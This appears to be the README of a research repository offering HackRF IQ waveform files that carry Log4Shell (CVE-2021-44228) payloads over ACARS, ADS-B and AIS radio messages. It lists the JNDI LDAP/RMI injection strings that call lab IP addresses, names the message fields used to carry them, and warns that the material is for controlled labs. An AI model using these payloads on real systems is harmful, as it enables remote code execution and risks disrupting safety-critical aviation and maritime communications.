# Log4shell waveforms for ACARS, ADS-B, and AIS

This repository contains **HackRF One** compatible IQ-waveforms for experimentation of log4shell exploitation using the ACARS, ADS-B, and AIS telecommunication protocols.

The waveforms deliver CVE-2021-44228 and related payloads wrapped into static IQ files, capable of exploitation of vulnerable **Apache Log4j2** versions.

The ACARS waveforms have a bandwitdh of 1 152 000 Hz, while the ADS-B and AIS waveforms have a bandwidth of 2 000 000 Hz.

## Payloads

* `${jndi:ldap://10.0.2.15:1389/ysbmnw}`
* `${jndi:rmi://10.0.2.15/a}`
* `${jndi:rmi://10.0.2.6/a}${jndi:rmi://10.0.2.7/b}`
* `${:-$${:-}}`

As the IPs suggest, the payloads are designed to be suitable for experimentation using VirtualBox enviroments. However, the payloads are equally destructive using real-life hardware and software, granted that the network address space is a match.

### Exploited telecommunication messaging fields

* **ACARS**: TEXT
* **ADS-B**: DF24 ELM
* **AIS**: Message 6 and Message 25

# It's on you

Disruption of aeronautical, maritime, or aerospace communications will put you to jail. Be smart and do not test your luck.

The contents of this repository are meant for experimental use only in controlled lab enviroments. Users of this repository are liable for any consequences.

## Copyrights

Copyright 2022 Artturi Juvonen (ACARS using [acarsgen](https://github.com/aajuvonen/acarsgen)), Andrei Costin & Hannu Turtiainen (ADS-B), and Syed Khandker (AIS)

## Licenses

MIT license. Read more in LICENSE.md.